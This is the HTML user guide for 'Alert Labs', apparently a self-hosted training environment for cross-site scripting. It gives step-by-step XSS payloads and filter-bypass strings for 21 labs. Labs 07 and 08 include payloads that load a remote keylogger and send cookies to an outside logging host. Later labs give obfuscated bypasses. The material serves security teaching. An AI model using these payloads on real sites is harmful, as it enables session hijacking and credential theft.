<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Alert Labs User Guide</title>
    <link rel="stylesheet" href="siimple.css">
    <link href="security.png" rel="icon" type="image/x-icon">
    <style>
        body {
            width: 100wh;
            height: 90vh;
            color: #000;
            background: #fff;
        }

        h1,
        h6 {
            font-family: 'Open Sans';
            font-weight: 300;
            text-align: center;
            position: absolute;
            top: 45%;
            right: 0;
            left: 0;
        }

        a:link,
        a:visited,
        a:hover,
        a:active {
            color: #1abc9c;
            text-decoration: none;
        }

        .siimple-code {
            font-size: 1.2em;
        }
    </style>
</head>

<body>



    <div class="siimple-grid-row">
        <div class="siimple-grid-col siimple-grid-col--12" style="text-align:center;color:white;">
            <a href="index.php"><div class="siimple-h1 awesome">Alert Labs</div></a>
            <div class="siimple-h4">Cross-site scripting labs for web application security enthusiasts</div>
        </div>
    </div>


    <div class="siimple-grid-row">
        <div class="siimple-grid-col siimple-grid-col--2">
            <div class="siimple-menu">
                <div class="siimple-menu-group">Menu</div>
                <a class="siimple-menu-item" href="#getting-started">Getting started</a>
                <a class="siimple-menu-item">Labs</a>
                <div class="siimple-menu-submenu">
                    <div class="siimple-menu-item"><a href="#lab-01">Lab 01</a></div>
                    <div class="siimple-menu-item"><a href="#lab-02">Lab 02</a></div>
                    <div class="siimple-menu-item"><a href="#lab-03">Lab 03</a></div>
                    <div class="siimple-menu-item"><a href="#lab-04">Lab 04</a></div>
                    <div class="siimple-menu-item"><a href="#lab-05">Lab 05</a></div>
                    <div class="siimple-menu-item"><a href="#lab-06">Lab 06</a></div>
                    <div class="siimple-menu-item"><a href="#lab-07">Lab 07</a></div>
                    <div class="siimple-menu-item"><a href="#lab-08">Lab 08</a></div>
                    <div class="siimple-menu-item"><a href="#lab-09">Lab 09</a></div>
                    <div class="siimple-menu-item"><a href="#lab-10">Lab 10</a></div>
                    <div class="siimple-menu-item"><a href="#lab-11">Lab 11</a></div>
                    <div class="siimple-menu-item"><a href="#lab-12">Lab 12</a></div>
                    <div class="siimple-menu-item"><a href="#lab-13">Lab 13</a></div>
                    <div class="siimple-menu-item"><a href="#lab-14">Lab 14</a></div>
                    <div class="siimple-menu-item"><a href="#lab-15">Lab 15</a></div>
                    <div class="siimple-menu-item"><a href="#lab-15">Lab 16</a></div>
                    <div class="siimple-menu-item"><a href="#lab-17">Lab 17</a></div>
                    <div class="siimple-menu-item"><a href="#lab-18">Lab 18</a></div>
                    <div class="siimple-menu-item"><a href="#lab-19">Lab 19</a></div>
                    <div class="siimple-menu-item"><a href="#lab-20">Lab 20</a></div>
                    <div class="siimple-menu-item"><a href="#lab-21">Lab 21</a></div>
                </div>
            </div>

        </div>
        <div class="siimple-grid-col siimple-grid-col--10">




            <div class="siimple-h5" id="getting-started">Getting started</div><br />
            <p class="siimple-p">
                1. Install <a href="https://www.docker.com/products/docker-desktop">Docker Desktop.</a><br /><br />
                2. Obtain the <a href="https://github.com/Abhi-M/alert-labs">Alert-Labs source code.</a><br /><br />
                3. Open Terminal and navigate to the alert-labs directory.<br /><br />
                4. Issue the following command:&emsp;<code class="siimple-code">docker-compose up -d</code><br /><br />
                <img src="screenshots/screen-00.png" width="500"/><br /><br />
                6. On your browser navigate to <a href="http://localhost:8090/">http://localhost:8090/</a><br /><br />
                7. You would be able to see the Alert-Labs home page.<br /><br />
                <img src="screenshots/screen-01.png" width="500"/><br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-01">Lab 01 - Let's start from URL</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 1<br /><br />
                <img src="screenshots/screen-02.png" width="500"/><br /><br />
                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-01.php?status=good</code><br /><br />
                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-01.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
                <img src="screenshots/screen-03.png" width="500"/><br /><br />
                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-01.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
                6. Observe the pop up alert box.<br /><br />
                <img src="screenshots/screen-04.png" width="500"/><br /><br />
                7. You have successfully performed a reflected cross-site scripting attack through a URL paramater.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" href="#lab-02">Lab 02 - Form</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 2<br /><br />
                2. Fill in your name on the input field<br /><br />
                3. Click on the <b>Send</b> button and observe the name being displayed again.<br /><br />
                4. Click back button on your browser.<br /><br />
                5. Try supplying the following in the name field &emsp;<code class="siimple-code">&lt;h1&gt;name&lt;/h1&gt;</code><br /><br />
                6. You have successfully performed HTML injection through a form input.<br /><br />
                7. Try supplying the following in the name field &emsp;<code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
                <img src="screenshots/screen-05.png" width="500"/><br /><br />
                6. Observe the pop up alert box.<br /><br />
                7. You have successfully performed a cross-site scripting attack through a form input.<br /><br />

              </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-03">Lab 03 - User agent</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 3<br /><br />
                2. Observe that page is displaying the user agent supplied by your browser.<br /><br />
                <img src="screenshots/screen-06.png" width="500"/><br /><br />
                3. Refer <a href="https://getmantra.com/web-app-security-testing-with-browsers/#useragent">this guide on how to switch the user agent</a><br /><br />
                4. Change the user agent to &emsp;<code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code> and refresh the page.<br /><br />
                6. Observe the pop up alert box.<br /><br />
                7. You have successfully performed a reflected cross-site scripting attack through a form input.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-04">Lab 04 - Referer</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 4<br /><br />
                2. Observe that page is displaying the referrer header value supplied by your browser.<br /><br />
                3. Create an HTML file with the following content <code class="siimple-code">&lt;a href="http://0.0.0.0:8090/step-04.php"&gt;click here&lt;/a&gt;</code><br /><br />
                3. Using terminal, navigate to the directory where the above HTML file is saved.<br /><br />
                4. Issue the following command &emsp;<code class="siimple-code">python -m SimpleHTTPServer</code> and refresh the page.<br /><br />
                <img src="screenshots/screen-07.png" width="500"/><br /><br />
                6. On your browser, navigate to the following URL: <code class="siimple-code">http://localhost:8000/index.html?id=%3Cscript%3Ealert()%3C/script%3E</code><br /><br />
                <img src="screenshots/screen-08.png" width="500"/><br /><br />
                7. Click on the 'click here' link.<br /><br />
                7. You have successfully performed a reflected cross-site scripting attack through referrer header.<br /><br />

            </p><br />...<br />





            <div class="siimple-h5" id="lab-05">Lab 05 - Cookie</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 5<br /><br />
                2. Observe that page is displaying the 'alert-labs' cookie value.<br /><br />
                <img src="screenshots/screen-09.png" width="500"/><br /><br />
                3. Refer <a href="https://getmantra.com/web-app-security-testing-with-browsers/#editcookie">this guide on how to edit cookies</a><br /><br />
                4. Change the value of alert-labs cookie to &emsp;<code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code> and refresh the page.<br /><br />
                6. Observe the pop up alert box.<br /><br />
                7. You have successfully performed a reflected cross-site scripting attack through a cookie.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-06">Lab 06 - Local storage</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 6<br /><br />
                2. Observe that page is displaying the 'alert-labs' local storage value.<br /><br />
                <img src="screenshots/screen-0a.png" width="500"/><br /><br />
                3. Refer <a href="https://getmantra.com/web-app-security-testing-with-browsers/#editlocalstorage">this guide on how to edit local storage</a><br /><br />
                4. Change the value of alert-labs local storage item to &emsp;<code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code> and refresh the page.<br /><br />
                6. Observe the pop up alert box.<br /><br />
                7. You have successfully performed a reflected cross-site scripting attack through a local storage item.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-07">Lab 07 - Login page</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 7<br /><br />
                2. Observe that page is displaying a login page.<br /><br />
                3. Try logging in with <code class="siimple-code">tom,tom</code> and <code class="siimple-code">admin,admin</code> as credentials.<br /><br />
                4. Try logging in with a wrong set of credentials.<br /><br />
                5. Observe the error message.<br /><br />
                <img src="screenshots/screen-0b.png" width="500"/><br /><br />
                6. Check the URL of the page. Observe that the error message is obtained from a URL paramter.<br /><br />
                7. Modify the URL paramater to &emsp;<code class="siimple-code">&lt;script src="https://exploitme.info/jk/key.js"&gt;&lt;/script&gt;</code> and load the page again.<br /><br />
                8. Enter new credentials on the page.<br /><br />
                9. Observe that data is being sent to a remote server by looking at the browser network traffic using DevTools.<br /><br />
                10. Observe that data is being logged at <code class="siimple-code">http://exploitme.info/jk/data.txt</code>.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-08">Lab 08 - Logged in page</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 8<br /><br />
                2. Observe that page is displaying a login page.<br /><br />
                3. Try logging in with <code class="siimple-code">tom,tom</code> and <code class="siimple-code">admin,admin</code> as credentials.<br /><br />
                5. Observe the page which specifies the user name of current logged-in user.<br /><br />
                <img src="screenshots/screen-0c.png" width="500"/><br /><br />
                6. Check the URL of the page. Observe that the user-name information is obtained from a URL paramter.<br /><br />
                7. Encode the following XSS payload <code class="siimple-code">&lt;script&gt;var cookie = "https://exploitme.info/cs/index.php?c="+escape(document.cookie);document.location=cookie;&lt;/script&gt;</code> using <a href="https://meyerweb.com/eric/tools/dencoder/">any online encoder/decoder</a>.<br /><br />
                8. Modify the URL paramater to the payload from above step and reload the page.<br /><br />
                9. Observe that data is being sent to a remote server by looking at the browser network traffic using DevTools.<br /><br />
                10. Observe that data is being logged at <code class="siimple-code">https://exploitme.info/cs/cookielog.txt</code>.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-09">Lab 09 - Stored XSS</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 09<br /><br />
                2. Fill in your name and click on the <b>Send</b> button.<br /><br />
                3. Observe that the name is being saved and is displayed even if the page is refreshed.<br /><br />
                4. Put the following XSS payload <code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code>in the name field and click on the <b>Send</b> button.<br /><br />
                14. Observe that the XSS payload is being execueted every time the web page is loaded.<br /><br />
                15. You have successfully performed a stored cross-site scripting attack.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-10">Lab 10 - Base64 encoding</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 10<br /><br />
                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=Z29vZA==</code><br /><br />
                <img src="screenshots/screen-0d.png" width="500"/><br /><br />
                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=%3Cscript%3Ealert(%27XSS%27);%3C/script%3E</code><br /><br />
                <img src="screenshots/screen-0e.png" width="500"/><br /><br />
                4. Observe that XSS payload is not working.<br /><br />
                4. Base64 encode the XSS payload and modify the URL with encoded payload.<br /><br />
                8. Observe that the XSS payload is working.<br /><br />
                <img src="screenshots/screen-0f.png" width="500"/><br /><br />
                9. You have successfully performed a reflected cross-site scripting through a base64 encoded parameter.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-11">Lab 11 - Removes alert</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 11<br /><br />
                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=good</code><br /><br />
                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
                6. Observe that the XSS payload is not working.<br /><br />
                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
                8. Observe that the XSS payload is working.<br /><br />
                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">prompt()</code>.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-10">Lab 12 - Removes script</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 12<br /><br />
                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=good</code><br /><br />
                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
                6. Observe that the XSS payload is not working.<br /><br />
                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
                8. Observe that the XSS payload is working.<br /><br />
                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">img</code> tag.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-13">Lab 13 - Removes img, alert, prompt, and script</div><br />
            <p class="siimple-p">
                1. Click on Alert Lab 13<br /><br />
                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=good</code><br /><br />
                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
                6. Observe that the XSS payload is not working.<br /><br />
                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
                8. Observe that the XSS payload is not working.<br /><br />
                9. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
                10. Observe that the XSS payload is not working.<br /><br />
                11. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;svg/onload=confirm()&gt;</code><br /><br />
                12. Observe that the XSS payload is working.<br /><br />
                13. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">svg</code> and <code class="siimple-code">confirm</code>tag.<br /><br />

            </p><br /><a href="#getting-started">▲</a><br />





            <div class="siimple-h5" id="lab-14">Lab 14 - Converts < and > to HTML entities</div><br />
            <p class="siimple-p">
                I tried to implement this https://securityonline.info/bypass-xss-filtering-using-hex-encoding/
				but that's not working on latest browsers

            </p><br /><a href="#getting-started">▲</a><br />
			
			
			
			<div class="siimple-h5" id="lab-15">Lab 15 - Regex filer #1</div><br />
            <p class="siimple-p">
                This payload will work - 
				<code class="siimple-code">&lt;&lt;a|ascript&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>
				
            </p><br /><a href="#getting-started">▲</a><br />
			
			
			<div class="siimple-h5" id="lab-16">Lab 16 - Regex filer #2</div><br />
            <p class="siimple-p">
			Thanks to http://www.blackhat.com/presentations/bh-usa-09/VELANAVA/BHUSA09-VelaNava-FavoriteXSS-SLIDES.pdf<br>
                These payloads will work - <br/>
				<code class="siimple-code">&lt;img src=&quot;x:alert&quot; onerror=&quot;eval(src%2b&#39;(0)&#39;)&quot;&gt;</code><br/>
				<code class="siimple-code">&lt;img src=&quot;x:gif&quot; onerror=&quot;eval(&#39;al&#39;%2b&#39;lert(0)&#39;)&quot;&gt;</code><br/>
				<code class="siimple-code">&lt;img src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;]
(0)&quot;&gt;&lt;/img&gt;</code><br/>
				
            </p><br /><a href="#getting-started">▲</a><br />
			
			
			
			<div class="siimple-h5" id="lab-17">Lab 17 - Regex filer #3</div><br />
            <p class="siimple-p">
                This payload will work - 
				<code class="siimple-code">%26%23x22%26%23x3e%26%23x3c%26%23x73%26%23x76%26%23x67%26%23x2f%26%23x6f%26%23x6e%26%23x6c%26%23x6f%26%23x61%26%23x64%26%23x3d%26%23x61%26%23x6c%26%23x65%26%23x72%26%23x74%26%23x28%26%23x31%26%23x29%26%23x3e</code>
				
            </p><br /><a href="#getting-started">▲</a><br />
			
			
			
			<div class="siimple-h5" id="lab-20">Lab 20 - Converts special characters to HTML entities on an HTML input value</div><br />
            <p class="siimple-p">
                This payload will work - 
				<code class="siimple-code">%22,%20alert(),%20%22</code>
				
            </p><br /><a href="#getting-started">▲</a><br />
			
			
			
			<div class="siimple-h5" id="lab-21">Lab 21 - Converts special characters to HTML entities on an HTML input value + capitalizes all characters
</div><br />
            <p class="siimple-p">
                This payload will work - 
				<code class="siimple-code">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</code>
				
            </p><br /><a href="#getting-started">▲</a><br />









           




        </div>
    </div>


    <div class="siimple-grid-row">
        <div class="siimple-grid-col siimple-grid-col--12" style="text-align:center;">
            Built with <a href="http://www.php.net/" target="_blank">PHP</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank">JavaScript</a>, and <a href="https://whatwg.org/" target="_blank">HTML</a>. Developed by <a href="https://www.linkedin.com/in/abhimbalakrishnan" target="_blank">Abhi M Balakrishnan</a>
        </div>
    </div>
</body>

</html>
